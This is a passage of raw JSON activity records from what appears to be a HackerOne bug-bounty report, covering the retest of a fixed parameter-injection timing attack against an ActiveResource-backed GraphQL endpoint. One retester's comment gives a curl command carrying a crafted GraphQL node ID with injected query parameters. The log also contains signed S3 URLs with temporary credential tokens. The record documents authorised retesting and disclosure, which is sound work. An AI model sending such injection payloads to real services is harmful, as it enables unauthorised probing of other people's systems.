patch is live.\u003c/p\u003e\n\n\u003cp\u003eThe fix can be determined by that injecting the parameters shouldn\u0026#39;t result in a time discrepancy anymore.\u003c/p\u003e\n","automated_response":false,"created_at":"2020-05-04T22:26:17.883Z","updated_at":"2020-05-04T22:30:58.922Z","actor":{"username":"jobert","cleared":true,"url":"/jobert","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/ht4b9SmcYNqmpbyCFXd7cxHB/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":true},"reporter":{"username":"jobert","url":"/jobert"},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":7892708,"is_internal":false,"editable":false,"type":"Activities::BugRetesting","message":"","markdown_message":"","automated_response":false,"created_at":"2020-05-04T22:27:17.981Z","updated_at":"2020-05-04T22:27:18.129Z","actor":{"username":"jobert","cleared":true,"url":"/jobert","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/ht4b9SmcYNqmpbyCFXd7cxHB/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"security","report_retest":{"id":1402,"retest_subscription":{"triage":false}},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":7892710,"is_internal":false,"editable":false,"type":"Activities::UserLeftRetest","message":"","markdown_message":"","automated_response":false,"created_at":"2020-05-04T22:27:25.320Z","updated_at":"2020-09-11T11:07:47.098Z","actor":{"username":"jobert","cleared":true,"url":"/jobert","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/ht4b9SmcYNqmpbyCFXd7cxHB/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":7892720,"is_internal":false,"editable":false,"type":"Activities::ExternalUserJoined","message":"","markdown_message":"","automated_response":false,"created_at":"2020-05-04T22:28:35.673Z","updated_at":"2020-05-04T22:28:35.673Z","additional_data":{"report_retest_user_id":4462},"actor":{"username":"the_arch_angel","cleared":true,"url":"/the_arch_angel","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/QWfPdadPrZC1WegBviatzUVW/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":7892777,"is_internal":false,"editable":false,"type":"Activities::UserLeftRetest","message":"","markdown_message":"","automated_response":false,"created_at":"2020-05-04T22:38:14.533Z","updated_at":"2020-09-11T11:07:47.102Z","actor":{"username":"the_arch_angel","cleared":true,"url":"/the_arch_angel","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/QWfPdadPrZC1WegBviatzUVW/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":7892787,"is_internal":false,"editable":false,"type":"Activities::ExternalUserJoined","message":"","markdown_message":"","automated_response":false,"created_at":"2020-05-04T22:39:01.167Z","updated_at":"2020-05-04T22:39:01.167Z","additional_data":{"report_retest_user_id":4463},"actor":{"username":"lemonoftroy","cleared":false,"url":"/lemonoftroy","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/YJR9WYj98YDCPtZujb2d47r5/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":7892819,"is_internal":false,"editable":false,"type":"Activities::UserLeftRetest","message":"","markdown_message":"","automated_response":false,"created_at":"2020-05-04T22:40:26.604Z","updated_at":"2020-09-11T11:07:47.106Z","actor":{"username":"lemonoftroy","cleared":false,"url":"/lemonoftroy","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/YJR9WYj98YDCPtZujb2d47r5/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":7892873,"is_internal":false,"editable":false,"type":"Activities::ExternalUserJoined","message":"","markdown_message":"","automated_response":false,"created_at":"2020-05-04T22:48:29.623Z","updated_at":"2020-05-04T22:48:29.623Z","additional_data":{"report_retest_user_id":4464},"actor":{"username":"bencode","cleared":false,"url":"/bencode","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/013/117/ddaa1da4e004e1234c6857c42f9bfa8df85b5ccf_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":7892874,"is_internal":false,"editable":false,"type":"Activities::UserLeftRetest","message":"","markdown_message":"","automated_response":false,"created_at":"2020-05-04T22:48:52.799Z","updated_at":"2020-09-11T11:07:47.110Z","actor":{"username":"bencode","cleared":false,"url":"/bencode","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/013/117/ddaa1da4e004e1234c6857c42f9bfa8df85b5ccf_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":7892885,"is_internal":false,"editable":false,"type":"Activities::ExternalUserJoined","message":"","markdown_message":"","automated_response":false,"created_at":"2020-05-04T22:50:38.479Z","updated_at":"2020-05-04T22:50:38.479Z","additional_data":{"report_retest_user_id":4465},"actor":{"username":"melar_dev","cleared":false,"url":"/melar_dev","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/tgyk8kZbmaHoq4j7SXhxTraz/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":7902102,"is_internal":false,"editable":false,"type":"Activities::UserLeftRetest","message":"","markdown_message":"","automated_response":false,"created_at":"2020-05-05T18:20:53.213Z","updated_at":"2020-09-11T11:07:47.115Z","actor":{"username":"melar_dev","cleared":false,"url":"/melar_dev","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/tgyk8kZbmaHoq4j7SXhxTraz/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":7902139,"is_internal":false,"editable":false,"type":"Activities::ExternalUserJoined","message":"","markdown_message":"","automated_response":false,"created_at":"2020-05-05T18:25:11.095Z","updated_at":"2020-05-05T18:25:11.095Z","additional_data":{"report_retest_user_id":4469},"actor":{"username":"nura_","cleared":false,"url":"/nura_","profile_picture_urls":{"medium":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/cvs1ubx964siwiyff3w61mbu5vjc/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5?response-content-disposition=inline%3B%20filename%3D%22cbchar2.png%22%3B%20filename%2A%3DUTF-8%27%27cbchar2.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQVHABZQ6K%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T065511Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQDLEUqN2OLO3OoArpAduXGS%2FnWvclGJ7L%2FhS7ZlCNuSFwIhAKgaDWYosUsMZYxmwMD0tSfLg1FWhbQHhU86z2hns38zKrQDCFcQARoMMDEzNjE5Mjc0ODQ5IgwVVQvbJjCbXZyRbMQqkQM9XNobju5ij3mHEd1PgXrpuzeU%2BCZaLl8s8%2FXPts8hYLholdRFqlYhDzTmecfnLqTs%2FH8df0Fzv8NVTOhsz9Cu3LtPJmYcyMM6%2BCttQ0%2F5YV36HpOoKx7YBCXq6g1wpqiR5h0NB8nCyNbtahjtqqfKrkQsAJtF0n6vty0Dy5dIMaKZufttk1eoYubwLgfaN4YAthfVEyCI75XoSBcWtozJGhmqio20Kggp%2Ff9ESWUDjkkVQkVc66j8SevucVwBZgdZjxbmMc3p%2B%2FrtliE8Di2Ov48U%2Bmiyzxgy0RsqgwBWQeuC1Vvrs6a5UgzB5X13VoO7Zw2O5pS1EKsi0EwbwxD1t1gkpOGC1X37B6qMMiSraZswcogi35QEMA8XAQhIC2z%2Byugz3gdhCR4lBTeHgZARRoRQvNYoLHEkvjD4clJ4fdfbD%2FRcWQb953U%2BunjxQu2802uN7zsOYAZ%2F1SufQ8paJbIHLgiZu%2FJLfuV6RY9q9hQTpnm6QoNT4fkLlHao602RIKkBGhLK4iU4VXdLBpw5JDCJiav%2FBTrqAW2UJwXizthXBPPIZ57e77V%2B1Jr9Up7MhIMK722MpJQ5S6y2sEj0IRzF6bBvFIGcuc7s5TvUPI3RoSg3%2BoRepHEHQDZpJfcEB%2FPh8Jr6a8ILTQYD91llJENl%2B%2FADn1n%2B0ihsitf2dEU%2F8Jff%2FNN3i9J2juS2OvqLeEbMdBuCToL%2BbYC8hsevJk6YzpVS0q2WxfTPUq4t7RHDwzTYfPmQnso8MCFcSKpUgp39ZmtjV4S1TWj23dyd7WkHgRbrIsNiFZci3GJYaEnzJmzKDIghO7k6z8NutfGp8Ayl%2FCKxt1goZhsy13ssETolsg%3D%3D\u0026X-Amz-Signature=7b87bc038a5866620b3f709e3fa51238d960563919c389bebf1a133d5bc2952a"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":7902217,"is_internal":false,"editable":false,"type":"Activities::UserLeftRetest","message":"","markdown_message":"","automated_response":false,"created_at":"2020-05-05T18:29:44.581Z","updated_at":"2020-09-11T11:07:47.119Z","actor":{"username":"nura_","cleared":false,"url":"/nura_","profile_picture_urls":{"medium":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/cvs1ubx964siwiyff3w61mbu5vjc/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5?response-content-disposition=inline%3B%20filename%3D%22cbchar2.png%22%3B%20filename%2A%3DUTF-8%27%27cbchar2.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQVHABZQ6K%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T065511Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQDLEUqN2OLO3OoArpAduXGS%2FnWvclGJ7L%2FhS7ZlCNuSFwIhAKgaDWYosUsMZYxmwMD0tSfLg1FWhbQHhU86z2hns38zKrQDCFcQARoMMDEzNjE5Mjc0ODQ5IgwVVQvbJjCbXZyRbMQqkQM9XNobju5ij3mHEd1PgXrpuzeU%2BCZaLl8s8%2FXPts8hYLholdRFqlYhDzTmecfnLqTs%2FH8df0Fzv8NVTOhsz9Cu3LtPJmYcyMM6%2BCttQ0%2F5YV36HpOoKx7YBCXq6g1wpqiR5h0NB8nCyNbtahjtqqfKrkQsAJtF0n6vty0Dy5dIMaKZufttk1eoYubwLgfaN4YAthfVEyCI75XoSBcWtozJGhmqio20Kggp%2Ff9ESWUDjkkVQkVc66j8SevucVwBZgdZjxbmMc3p%2B%2FrtliE8Di2Ov48U%2Bmiyzxgy0RsqgwBWQeuC1Vvrs6a5UgzB5X13VoO7Zw2O5pS1EKsi0EwbwxD1t1gkpOGC1X37B6qMMiSraZswcogi35QEMA8XAQhIC2z%2Byugz3gdhCR4lBTeHgZARRoRQvNYoLHEkvjD4clJ4fdfbD%2FRcWQb953U%2BunjxQu2802uN7zsOYAZ%2F1SufQ8paJbIHLgiZu%2FJLfuV6RY9q9hQTpnm6QoNT4fkLlHao602RIKkBGhLK4iU4VXdLBpw5JDCJiav%2FBTrqAW2UJwXizthXBPPIZ57e77V%2B1Jr9Up7MhIMK722MpJQ5S6y2sEj0IRzF6bBvFIGcuc7s5TvUPI3RoSg3%2BoRepHEHQDZpJfcEB%2FPh8Jr6a8ILTQYD91llJENl%2B%2FADn1n%2B0ihsitf2dEU%2F8Jff%2FNN3i9J2juS2OvqLeEbMdBuCToL%2BbYC8hsevJk6YzpVS0q2WxfTPUq4t7RHDwzTYfPmQnso8MCFcSKpUgp39ZmtjV4S1TWj23dyd7WkHgRbrIsNiFZci3GJYaEnzJmzKDIghO7k6z8NutfGp8Ayl%2FCKxt1goZhsy13ssETolsg%3D%3D\u0026X-Amz-Signature=7b87bc038a5866620b3f709e3fa51238d960563919c389bebf1a133d5bc2952a"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":7902266,"is_internal":false,"editable":false,"type":"Activities::ExternalUserJoined","message":"","markdown_message":"","automated_response":false,"created_at":"2020-05-05T18:34:07.712Z","updated_at":"2020-05-05T18:34:07.712Z","additional_data":{"report_retest_user_id":4470},"actor":{"username":"wh11tew0lf","cleared":true,"url":"/wh11tew0lf","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/055/039/9edf4370aad141a35e6c11b4adc4267375181f28_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":7905864,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"For the hacker retesting this: [here is the fix](https://github.com/rails/activeresource/commit/71f349ade11c05e56fb67132e6e167d8a8fe4a5e), which was merged and released earlier today (see [ruby-sec announcement](https://groups.google.com/forum/#!msg/ruby-security-ann/r0TL_YzNSR0/lzj5bQ1CAQAJ)). When retesting this, we're mainly interested in one thing: are you able to reproduce the timing attack that was described? Any potential regressions can be submitted to [our program](/security) and to @rails directly.","markdown_message":"\u003cp\u003eFor the hacker retesting this: \u003ca href=\"/redirect?url=https%3A%2F%2Fgithub.com%2Frails%2Factiveresource%2Fcommit%2F71f349ade11c05e56fb67132e6e167d8a8fe4a5e\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehere is the fix\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e, which was merged and released earlier today (see \u003ca href=\"/redirect?url=https%3A%2F%2Fgroups.google.com%2Fforum%2F%23%21msg%2Fruby-security-ann%2Fr0TL_YzNSR0%2Flzj5bQ1CAQAJ\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003eruby-sec announcement\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e). When retesting this, we\u0026#39;re mainly interested in one thing: are you able to reproduce the timing attack that was described? Any potential regressions can be submitted to \u003ca href=\"/security\"\u003eour program\u003c/a\u003e and to @rails directly.\u003c/p\u003e\n","automated_response":false,"created_at":"2020-05-06T00:46:05.196Z","updated_at":"2020-05-06T00:46:05.196Z","actor":{"username":"jobert","cleared":true,"url":"/jobert","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/ht4b9SmcYNqmpbyCFXd7cxHB/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":7916346,"is_internal":false,"editable":false,"type":"Activities::RetestUserExpired","message":"","markdown_message":"","automated_response":false,"created_at":"2020-05-06T18:55:05.018Z","updated_at":"2020-09-11T11:07:46.971Z","actor":{"username":"wh11tew0lf","cleared":true,"url":"/wh11tew0lf","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/055/039/9edf4370aad141a35e6c11b4adc4267375181f28_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":7916363,"is_internal":false,"editable":false,"type":"Activities::ExternalUserJoined","message":"","markdown_message":"","automated_response":false,"created_at":"2020-05-06T18:56:37.764Z","updated_at":"2020-05-06T18:56:37.764Z","additional_data":{"report_retest_user_id":4483},"actor":{"username":"kunal94","cleared":true,"url":"/kunal94","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/nKjE1ZsrDAM8DFhBUE4KdW4q/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":7920082,"is_internal":false,"editable":false,"type":"Activities::UserLeftRetest","message":"","markdown_message":"","automated_response":false,"created_at":"2020-05-07T05:15:04.029Z","updated_at":"2020-09-11T11:07:47.124Z","actor":{"username":"kunal94","cleared":true,"url":"/kunal94","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/nKjE1ZsrDAM8DFhBUE4KdW4q/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":7920091,"is_internal":false,"editable":false,"type":"Activities::ExternalUserJoined","message":"","markdown_message":"","automated_response":false,"created_at":"2020-05-07T05:15:56.369Z","updated_at":"2020-05-07T05:15:56.369Z","additional_data":{"report_retest_user_id":4484},"actor":{"username":"x3n0nn3p","cleared":false,"url":"/x3n0nn3p","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/017/168/e092ba1282471c02588431d484fb4d0da1be4de9_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":7921118,"is_internal":false,"editable":false,"type":"Activities::UserCompletedRetest","message":"Test:\n\n``` bash\ntime /usr/bin/curl -isk 'https://hackerone.com/graphql' -H 'Accept: application/json' -H 'Content-type: application/json' -d '{\"query\":\"query{node(id:\\\"gid://hackerone/PaymentsLibrary::Payment/%3fcore_hacker_username%3djobert%26core_team_handle%3dsecurity%26\\\"){... on User {id}}}\"}' | grep --color=never -P 'HTTP|\"data\"'\n```\n\n{F818828}\nNo time discrepancies and both queries return 500 as expected.\n\n","markdown_message":"\u003cp\u003eTest:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight shell\"\u003e\u003ccode\u003e\u003cspan class=\"nb\"\u003etime\u003c/span\u003e /usr/bin/curl \u003cspan class=\"nt\"\u003e-isk\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;https://hackerone.com/graphql\u0026#39;\u003c/span\u003e \u003cspan class=\"nt\"\u003e-H\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;Accept: application/json\u0026#39;\u003c/span\u003e \u003cspan class=\"nt\"\u003e-H\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;Content-type: application/json\u0026#39;\u003c/span\u003e \u003cspan class=\"nt\"\u003e-d\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;{\u0026quot;query\u0026quot;:\u0026quot;query{node(id:\\\u0026quot;gid://hackerone/PaymentsLibrary::Payment/%3fcore_hacker_username%3djobert%26core_team_handle%3dsecurity%26\\\u0026quot;){... on User {id}}}\u0026quot;}\u0026#39;\u003c/span\u003e | \u003cspan class=\"nb\"\u003egrep\u003c/span\u003e \u003cspan class=\"nt\"\u003e--color\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003enever \u003cspan class=\"nt\"\u003e-P\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;HTTP|\u0026quot;data\u0026quot;\u0026#39;\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003e\u003ca class=\"markdown-attachment-link markdown-attachment-inline-reference\" data-attachment-filename=\"retest.png\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/hNGiEy5YxsYVmhtgiR322dfX?response-content-disposition=attachment%3B%20filename%3D%22retest.png%22%3B%20filename%2A%3DUTF-8%27%27retest.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQVHABZQ6K%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T065511Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQDLEUqN2OLO3OoArpAduXGS%2FnWvclGJ7L%2FhS7ZlCNuSFwIhAKgaDWYosUsMZYxmwMD0tSfLg1FWhbQHhU86z2hns38zKrQDCFcQARoMMDEzNjE5Mjc0ODQ5IgwVVQvbJjCbXZyRbMQqkQM9XNobju5ij3mHEd1PgXrpuzeU%2BCZaLl8s8%2FXPts8hYLholdRFqlYhDzTmecfnLqTs%2FH8df0Fzv8NVTOhsz9Cu3LtPJmYcyMM6%2BCttQ0%2F5YV36HpOoKx7YBCXq6g1wpqiR5h0NB8nCyNbtahjtqqfKrkQsAJtF0n6vty0Dy5dIMaKZufttk1eoYubwLgfaN4YAthfVEyCI75XoSBcWtozJGhmqio20Kggp%2Ff9ESWUDjkkVQkVc66j8SevucVwBZgdZjxbmMc3p%2B%2FrtliE8Di2Ov48U%2Bmiyzxgy0RsqgwBWQeuC1Vvrs6a5UgzB5X13VoO7Zw2O5pS1EKsi0EwbwxD1t1gkpOGC1X37B6qMMiSraZswcogi35QEMA8XAQhIC2z%2Byugz3gdhCR4lBTeHgZARRoRQvNYoLHEkvjD4clJ4fdfbD%2FRcWQb953U%2BunjxQu2802uN7zsOYAZ%2F1SufQ8paJbIHLgiZu%2FJLfuV6RY9q9hQTpnm6QoNT4fkLlHao602RIKkBGhLK4iU4VXdLBpw5JDCJiav%2FBTrqAW2UJwXizthXBPPIZ57e77V%2B1Jr9Up7MhIMK722MpJQ5S6y2sEj0IRzF6bBvFIGcuc7s5TvUPI3RoSg3%2BoRepHEHQDZpJfcEB%2FPh8Jr6a8ILTQYD91llJENl%2B%2FADn1n%2B0ihsitf2dEU%2F8Jff%2FNN3i9J2juS2OvqLeEbMdBuCToL%2BbYC8hsevJk6YzpVS0q2WxfTPUq4t7RHDwzTYfPmQnso8MCFcSKpUgp39ZmtjV4S1TWj23dyd7WkHgRbrIsNiFZci3GJYaEnzJmzKDIghO7k6z8NutfGp8Ayl%2FCKxt1goZhsy13ssETolsg%3D%3D\u0026amp;X-Amz-Signature=b036b66b2ab3c4c6abdad27e8e40ab6cbd8fdf56cb0c1c3776b1479fdc9e63c2\" data-attachment-type=\"image/png\"\u003e\u003cimg src=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/hNGiEy5YxsYVmhtgiR322dfX?response-content-disposition=attachment%3B%20filename%3D%22retest.png%22%3B%20filename%2A%3DUTF-8%27%27retest.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQVHABZQ6K%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T065511Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQDLEUqN2OLO3OoArpAduXGS%2FnWvclGJ7L%2FhS7ZlCNuSFwIhAKgaDWYosUsMZYxmwMD0tSfLg1FWhbQHhU86z2hns38zKrQDCFcQARoMMDEzNjE5Mjc0ODQ5IgwVVQvbJjCbXZyRbMQqkQM9XNobju5ij3mHEd1PgXrpuzeU%2BCZaLl8s8%2FXPts8hYLholdRFqlYhDzTmecfnLqTs%2FH8df0Fzv8NVTOhsz9Cu3LtPJmYcyMM6%2BCttQ0%2F5YV36HpOoKx7YBCXq6g1wpqiR5h0NB8nCyNbtahjtqqfKrkQsAJtF0n6vty0Dy5dIMaKZufttk1eoYubwLgfaN4YAthfVEyCI75XoSBcWtozJGhmqio20Kggp%2Ff9ESWUDjkkVQkVc66j8SevucVwBZgdZjxbmMc3p%2B%2FrtliE8Di2Ov48U%2Bmiyzxgy0RsqgwBWQeuC1Vvrs6a5UgzB5X13VoO7Zw2O5pS1EKsi0EwbwxD1t1gkpOGC1X37B6qMMiSraZswcogi35QEMA8XAQhIC2z%2Byugz3gdhCR4lBTeHgZARRoRQvNYoLHEkvjD4clJ4fdfbD%2FRcWQb953U%2BunjxQu2802uN7zsOYAZ%2F1SufQ8paJbIHLgiZu%2FJLfuV6RY9q9hQTpnm6QoNT4fkLlHao602RIKkBGhLK4iU4VXdLBpw5JDCJiav%2FBTrqAW2UJwXizthXBPPIZ57e77V%2B1Jr9Up7MhIMK722MpJQ5S6y2sEj0IRzF6bBvFIGcuc7s5TvUPI3RoSg3%2BoRepHEHQDZpJfcEB%2FPh8Jr6a8ILTQYD91llJENl%2B%2FADn1n%2B0ihsitf2dEU%2F8Jff%2FNN3i9J2juS2OvqLeEbMdBuCToL%2BbYC8hsevJk6YzpVS0q2WxfTPUq4t7RHDwzTYfPmQnso8MCFcSKpUgp39ZmtjV4S1TWj23dyd7WkHgRbrIsNiFZci3GJYaEnzJmzKDIghO7k6z8NutfGp8Ayl%2FCKxt1goZhsy13ssETolsg%3D%3D\u0026amp;X-Amz-Signature=b036b66b2ab3c4c6abdad27e8e40ab6cbd8fdf56cb0c1c3776b1479fdc9e63c2\" class=\"markdown-inline-image\" style=\"display: inline-block\"\u003e\u003c/a\u003e\u003cbr\u003e\nNo time discrepancies and both queries return 500 as expected.\u003c/p\u003e\n","automated_response":false,"created_at":"2020-05-07T06:55:02.979Z","updated_at":"2020-05-07T06:55:02.979Z","actor":{"username":"x3n0nn3p","cleared":false,"url":"/x3n0nn3p","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/017/168/e092ba1282471c02588431d484fb4d0da1be4de9_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"attachments":[{"id":818828,"filename":"retest.png","type":"image/png","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/hNGiEy5YxsYVmhtgiR322dfX?response-content-disposition=attachment%3B%20filename%3D%22retest.png%22%3B%20filename%2A%3DUTF-8%27%27retest.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQVHABZQ6K%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T065511Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQDLEUqN2OLO3OoArpAduXGS%2FnWvclGJ7L%2FhS7ZlCNuSFwIhAKgaDWYosUsMZYxmwMD0tSfLg1FWhbQHhU86z2hns38zKrQDCFcQARoMMDEzNjE5Mjc0ODQ5IgwVVQvbJjCbXZyRbMQqkQM9XNobju5ij3mHEd1PgXrpuzeU%2BCZaLl8s8%2FXPts8hYLholdRFqlYhDzTmecfnLqTs%2FH8df0Fzv8NVTOhsz9Cu3LtPJmYcyMM6%2BCttQ0%2F5YV36HpOoKx7YBCXq6g1wpqiR5h0NB8nCyNbtahjtqqfKrkQsAJtF0n6vty0Dy5dIMaKZufttk1eoYubwLgfaN4YAthfVEyCI75XoSBcWtozJGhmqio20Kggp%2Ff9ESWUDjkkVQkVc66j8SevucVwBZgdZjxbmMc3p%2B%2FrtliE8Di2Ov48U%2Bmiyzxgy0RsqgwBWQeuC1Vvrs6a5UgzB5X13VoO7Zw2O5pS1EKsi0EwbwxD1t1gkpOGC1X37B6qMMiSraZswcogi35QEMA8XAQhIC2z%2Byugz3gdhCR4lBTeHgZARRoRQvNYoLHEkvjD4clJ4fdfbD%2FRcWQb953U%2